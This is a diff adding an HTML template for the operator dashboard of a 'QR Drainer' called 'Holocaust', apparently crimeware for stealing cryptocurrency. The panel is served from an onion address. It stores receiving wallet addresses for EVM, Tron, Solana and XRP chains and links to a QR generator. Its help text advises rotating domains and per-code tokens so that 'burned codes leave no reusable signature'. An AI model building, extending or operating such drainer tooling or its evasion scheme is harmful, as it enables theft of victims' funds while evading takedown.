@@ -1,0 +1,50 @@
+{{define "dash.html"}}<!doctype html>
+<html><head><meta charset="utf-8"><title>Holocaust / Dashboard</title>
+<style>
+body{font-family:system-ui;background:#0b0f14;color:#e6e8eb;margin:0;padding:28px;max-width:760px;margin-left:auto;margin-right:auto}
+h1{font-size:18px;font-weight:600}h2{font-size:14px;font-weight:600;color:#9fb2c4;margin-top:32px}
+a{color:#4ade80;text-decoration:none}
+table{width:100%;border-collapse:collapse;font-size:13.5px;margin-top:8px}
+td,th{padding:7px 8px;border-bottom:1px solid #1c2632;text-align:left}
+th{color:#8fa2b5;font-weight:500;font-size:12px;text-transform:uppercase;letter-spacing:.4px}
+input,select{background:#0b0f14;border:1px solid #2a3644;color:#e6e8eb;padding:8px;border-radius:6px;font-size:13.5px;width:100%;box-sizing:border-box}
+button{background:#1d4ed8;color:#fff;border:0;padding:9px 16px;border-radius:6px;font-size:13.5px;cursor:pointer}
+.btn2{background:#334155}
+form{margin-top:6px}
+.row{display:flex;gap:10px;margin-top:8px}
+.row input{flex:1}
+.ok{color:#4ade80;font-size:13px}
+.mut{color:#8fa2b5;font-size:12.5px}
+code{background:#111820;padding:2px 5px;border-radius:4px;font-size:12.5px}
+</style></head><body>
+<h1>Holocaust &mdash; QR Drainer Control</h1>
+<p class="mut">Panel: <code>{{.Onion}}</code> &middot; <a href="/generate">Generate QR code</a> &middot; <a href="/logout">Lock</a></p>
+
+<h2>1 &middot; Receiving addresses (per chain family)</h2>
+<table>
+<tr><th>Chain</th><th>Receiver on file</th></tr>
+{{range .List}}
+<tr><td>{{.Name}} <span class="mut">({{.Symbol}})</span></td>
+<td>{{with index $.Recv .ID}}{{if .EVM}}{{.EVM}}{{else if .Tron}}{{.Tron}}{{else if .Solana}}{{.Solana}}{{else if .XRP}}{{.XRP}}{{else}}<span class="mut">not set</span>{{end}}{{else}}<span class="mut">not set</span>{{end}}</td></tr>
+{{end}}
+</table>
+
+<h2>Set / update a receiver</h2>
+<form method="post" action="/receiver">
+<div class="row">
+<select name="chain" style="flex:0 0 220px">
+{{$recv := .Recv}}
+{{range .List}}<option value="{{.ID}}">{{.Name}}</option>{{end}}
+</select>
+<input name="addr" placeholder="Address (validated server-side)">
+<button type="submit">Save</button>
+</div>
+</form>
+
+<h2>2 &middot; QR lifecycle</h2>
+<p class="mut">Every generation mints a fresh signed token &mdash; the static-host hop
+page and the QR image change every time, so burned codes leave no reusable
+signature. Rotate the static domain from the generator form as often as you
+like; nothing on the panel ties old codes to new ones.</p>
+<p><a href="/generate"><button type="button">Open QR generator &rarr;</button></a></p>
+</body></html>{{end}}
